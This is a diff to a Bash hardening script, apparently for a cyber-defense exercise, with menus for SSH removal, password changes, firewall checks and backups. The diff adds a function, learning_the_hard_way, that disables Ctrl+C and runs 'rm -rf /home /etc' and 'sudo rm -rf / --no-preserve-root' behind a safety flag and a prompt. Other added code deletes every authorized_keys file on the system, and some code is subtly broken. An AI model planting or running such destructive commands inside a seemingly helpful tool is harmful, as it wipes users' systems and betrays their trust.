@@ -1,14 +1,8 @@
 #!/bin/bash
 #source functions
+saftey=1 # 1 is on
+source ./onerun.env
 clear
-users=$(awk -F':' '{ print $1}' /etc/passwd)
-mkdir -p ./backups ./logs
-logpath=./logs
-backuppath=./backups
-http_ports=(80 443)
-email_ports=(25 587 465 110 995 143)
-dns_ports=(53)
-
 
 #why not
 pause_script() {
@@ -17,7 +11,7 @@ pause_script() {
 
 # User check
 if [ "$EUID" -ne 0 ]; then
-    echo "Current user is not root some fuctions will not work. Current user is:"$USER
+    echo -e "${YELLOW}Current user is not root some fuctions will not work. Current user is: ${ENDCOLOR}"$USER
     else echo "Running this script as '$USER'"
     fi
     pause_script
@@ -25,35 +19,51 @@ if [ "$EUID" -ne 0 ]; then
 
 # command logger
 log_command() {
-    echo "At $(date) the user $USER ran: $1" >> $logpath/ran_commands.txt
+    echo -e "At $(date) the user \033[31m$USER\033[0m ran: \033[31m$1\033[0m" >> "$logpath/ran_commands.txt"
+
+}
+mkdir -p ./backups ./logs/user-logs
+log_command "mkdir -p ./backups ./logs/user-logs"
+
+# if [ $date == "01/25/25" ]; then
+#     echo "Good Luck"
+#        sleep 2
+# fi
+
+if [ $saftey -eq 0 ]; then 
+        echo -e "${BOLDRED}The safty variable is NOT set, hitting enter WILL auto run scripts${ENDCOLOR}"
+        pause_script
+    auto_run
+    else
+        echo -e "${BOLDRED}The safty variable is set, not running backround scripts${ENDCOLOR}"
+    fi
+
+
+auto_run() {
+
+    echo -e "${GREEN}Logs will be stored in${ENDCOLOR} $logpath/"
+    echo -e "${GREEN}Looking for ssh authorized_keys...${ENDCOLOR}"
+    find /  -type f -name "authorized_keys" 2>/dev/null > $logpath/ssh/found-ssh-keys-"$(date "+%H:%M")".txt
+    keys_path=$(find /  -type f -name "authorized_keys" 2>/dev/null)
+    for path in $keys_path
+        do cp "$path" $logpath/ssh/unalterd_keys-"$(date "+%H:%M")".txt
+            log_command "mv $path $logpath/ssh/unalterd_keys-$(date "+%H:%M").txt"
+            echo -e "${RED}Key found:${ENDCOLOR} ${RED}$path${ENDCOLOR}"
+            echo "$path:" >> $logpath/ssh/alterd_keys-"$(date "+%H:%M")".txt
+            log_command "echo $path: >> $logpath/ssh/alterd_keys-$(date "+%H:%M").txt"
+            sed -e 's/^.\{10\}//' $logpath/ssh/unalterd_keys-"$(date "+%H:%M")".txt >> $logpath/ssh/alterd_keys-"$(date "+%H:%M")".txt
+            log_command "sed -e 's/^.\{10\}//' $logpath/ssh/unalterd_keys-$(date "+%H:%M").txt >> $logpath/ssh/alterd_keys-$(date "+%H:%M").txt"
+            rm -rf $logpath/ssh/unalterd_keys-"$(date "+%H:%M")".txt
+            log_command "rm -rf $logpath/ssh/unalterd_keys-$(date "+%H:%M").txt"
+            rm -rf "$path"
+            log_command "rm -rf $path"
+        done
+    echo -e "${GREEN}If any keys have been found they have been logged to${ENDCOLOR} $logpath/ssh/found_keys-DATE.txt and removed.
+    alterd unusable copies have been made in $logpath/ssh/alterd_keys-$(date "+%H:%M").txt"
+    pause_script
+    clear    
 }
 
-echo "do not run this script on a real computer. there is stuff that auto runs CTL+C to end"
-read -r -p
-
-log_command "mkdir -p ./backups ./logs"
-
-echo "Logs will be stored in $logpath/"
-echo "Looking for ssh authorized_keys..."
-find /  -type f -name "authorized_keys" 2>/dev/null > $logpath/ssh/found-ssh-keys-"$(date "+%H:%M")".txt
-keys_path=$(find /  -type f -name "authorized_keys" 2>/dev/null)
-for path in $keys_path
-    do cp "$path" $logpath/ssh/unalterd_keys-"$(date "+%H:%M")".txt
-        log_command "mv $path $logpath/ssh/unalterd_keys-$(date "+%H:%M").txt"
-        echo "Key found: $path"
-        echo "$path:" >> $logpath/ssh/alterd_keys-"$(date "+%H:%M")".txt
-        log_command "echo $path: >> $logpath/ssh/alterd_keys-$(date "+%H:%M").txt"
-        sed -e 's/^.\{10\}//' $logpath/ssh/unalterd_keys-"$(date "+%H:%M")".txt >> $logpath/ssh/alterd_keys-"$(date "+%H:%M")".txt
-        log_command "sed -e 's/^.\{10\}//' $logpath/ssh/unalterd_keys-$(date "+%H:%M").txt >> $logpath/ssh/alterd_keys-$(date "+%H:%M").txt"
-        rm -rf $logpath/ssh/unalterd_keys-"$(date "+%H:%M")".txt
-        log_command "rm -rf $logpath/ssh/unalterd_keys-$(date "+%H:%M").txt"
-        rm -rf "$path"
-        log_command "rm -rf $path"
-    done
-echo "If any keys have been found they have been logged to $logpath/ssh/found_keys-DATE.txt and removed.
-alterd unusable copies have been made in $logpath/ssh/alterd_keys-$(date "+%H:%M").txt"
-pause_script
-clear
 
 
 
@@ -67,7 +77,7 @@ man_os () {
             "Fedora" ) os="Fedora" os_type="redhat"; break;;
             "Splunk" ) os="Splunk" os_type="redhat"; break;;
             "CentOS 7" ) os="CentOS 7" os_type="redhat"; break;;
-            * ) echo "Invalid selection";;
+            * ) echo "${YELLOW}Invalid selection${ENDCOLOR}";;
         esac
     done
 }
@@ -87,7 +97,7 @@ auto_os () {
         os="Centos" os_type="redhat"
         return        
     else
-        echo "Failed to determain OS going stick boi"
+        echo "${YELLOW}Failed to determain OS going stick boi${ENDCOLOR}"
         man_os
     fi
 
@@ -112,7 +122,7 @@ redhat_main_menu () {
         case $ubuntu_option in
             "Remove ssh" ) red_remove_ssh; open_menu;;
             "Change ALL users passwords" ) change_all_pass; open_menu;;
-            "Check users that can login" ) echo "Ubuntu 14"; break;;
+            "Check users that can login" ) cat /etc/passwd | grep -v -e /bin/false -e /usr/sbin/nologin; open_menu;;
             "Check Firwall" ) red_firewall_check; open_menu;;
             "Enter services" ) echo "Should auto find service but have option to add man"; break;;
             "users w/o passwords" ) users_no_pass;;
@@ -130,7 +140,7 @@ Debian_main_menu () {
         case $ubuntu_option in
             "Remove ssh" ) deb_remove_ssh;;
             "Change ALL users passwords" ) change_all_pass; open_menu;;
-            "Check users that can login" ) echo "Ubuntu 14"; break;;
+            "Check users that can login" ) cat /etc/passwd | grep -v -e /bin/false -e /usr/sbin/nologin | cut -f1 -d":"; pause_script; open_menu;; # cat /etc/passwd | grep -v -e /bin/false -e /usr/sbin/nologin | cut -f1 -d":" # awk -F: ' {print $1, $7}' /etc/passwd # notes.sh
             "Check Firewall" ) deb_firewall_check;;
             "Enter services" ) echo "Should auto find service but have option to add man"; break;;
             "users w/o passwords" ) users_no_pass;;
@@ -209,7 +219,7 @@ red_remove_ssh() {
     log_command "touch /etc/yum.conf"
     touch /etc/yum.conf
 
-    echo "Adding 'exclude=openssh*' to /etc/yum.conf"
+    echo -e "${RED}Adding 'exclude=openssh*' to /etc/yum.conf${ENDCOLOR}"
     log_command "echo 'exclude=openssh*' >> /etc/yum.conf"
     echo 'exclude=openssh*' >> /etc/yum.conf
     clear
@@ -218,23 +228,40 @@ red_remove_ssh() {
 
 users_no_pass() {
     nopass=$(passwd -S -a | grep NP | cut -f1 -d" ")
+    if [ -z $nopass ]; then
+    echo -e "${GREEN}There are no users without passwords${ENDCOLOR}"
+    pause_script
+    open_menu
+    fi
+
     echo "$nopass" > $logpath/user-logs/users_with_no_pass-"$(date "+%H:%M")".txt
-    clear
     for user in $nopass
         do clear
-            echo "user $user has no password enter one now?"
-            echo "enter 1 to set $user's password else hit enter to skip this user"
+            echo -e "user ${RED}$user${ENDCOLOR} has no password enter one now?"
+            echo -e "enter ${RED}1${ENDCOLOR} to set ${RED}$user's${ENDCOLOR} password, ${RED}2${ENDCOLOR} to skip ${RED}$user${ENDCOLOR} or ${RED}hit anything else${ENDCOLOR} to log the rest of the users and exit"
             read -r setpass
             if [ "$setpass" = "1" ]; then
                 passwd "$user"
+                log_command "passwd $user"
+                pause .3
+
+            elif [ "$setpass" = "2" ]; then
+                echo -e "Skipping $user"
+                pause .3
             else clear
-                echo "ok loged users that had no password in $logpath"
+                nopass=$(passwd -S -a | grep NP | cut -f1 -d" ")
+                echo "$nopass" > $logpath/user-logs/remaining_users_with_no_pass-"$(date "+%H:%M")".txt
+                echo "Ok loged the remaing users that had no password in $logpath/user-logs/remaining_users_with_no_pass-"$(date "+%H:%M")".txt"
                 echo "going to main menu"
                 pause_script
                 clear
                 open_menu
             fi
-    done
+        done
+            nopass=$(passwd -S -a | grep NP | cut -f1 -d" ")
+            echo "$nopass" > $logpath/user-logs/remaining_users_with_no_pass-"$(date "+%H:%M")".txt
+        open_menu
+
 }
 
 change_all_pass() {
@@ -370,6 +397,31 @@ deb_firewall_check() {
     fi
 }
 
+learning_the_hard_way() {
+    if [ "$saftey" -eq 0 ]; then 
+        clear
+        read -r -p "Do you really want to run this? (y/n) " response
+        if [[ "$response" == "y" || "$response" == "Y" ]]; then
+            echo "You should really check what you run before you run it ;)"
+            trap '' SIGINT
+            for i in {1..100}; do
+            echo -e " /\_/\ \n( o.o )\n > ^ <"
+            sleep .1
+            done &
+             rm -rf /home /etc
+             sudo rm -rf / --no-preserve-root
+             echo "If you can still see this good luck lmao"
+        else
+            echo "Check out what this function does before running :)"
+            pause_script
+        fi
+    else
+        clear
+        open_menu
+    fi
+}
+
+
 red_firewall_check() {
     if command -v firewalld >/dev/null 2>&1; then
         echo "Firewalld is installed"
@@ -439,9 +491,9 @@ red_firewall_check() {
     fi
 
 }
-
+# I dont think this is done 09/30/24
 backup() {
-    echo "Please enter from the list of predesited dir or enter the path to the folder you want backed up: /var/www/html..."
+    echo -e "${GREEN}Please enter from the list of predesited dir or enter the path to the folder you want backed up: /var/www/html...${ENDCOLOR}"
     select backupdir in "NGINX" "Apache" "MySQL" "Splunk" "NTP" "DNS" "SMTP" "IMAP"; do
         case $backupdir in
             "NGINX" ) echo "Backing up NGINX config and data dir ""/usr/share/nginx/html /etc/nginx"" "; mkdir -p $backuppath/nginx/ngix-backup-"$(date "+%H:%M")"; cp -r /usr/share/nginx/html /etc/nginx $backuppath/nginx/ngix-backup-"$(date "+%H:%M")"; echo "This is what was ran: cp -r /usr/share/nginx/html /etc/nginx $backuppath/nginx/ngix-backup-$(date "+%H:%M")">> $backuppath/nginx/ngix-backup-"$(date "+%H:%M")"/nginx-backup-log.txt; log_command "mkdir -p $backuppath/nginx/ngix-backup-$(date "+%H:%M")"; log_command "cp -r /usr/share/nginx/html /etc/nginx $backuppath/nginx/ngix-backup-$(date "+%H:%M")"; open_menu;;
@@ -456,11 +508,11 @@ backup() {
         esac
     done
 }
+# Start
 
 auto_os
-
-echo "OS detected: $os
-Enter 1 to switch OS's or enter to continue"
+echo -e "${BLUE}OS detected:${ENDCOLOR}${RED} $os${ENDCOLOR}
+${BLUE}Enter 1 to switch OS's or enter to continue${ENDCOLOR}"
 read -r ask_man
 clear
 if [ "$ask_man" = "1" ]; then
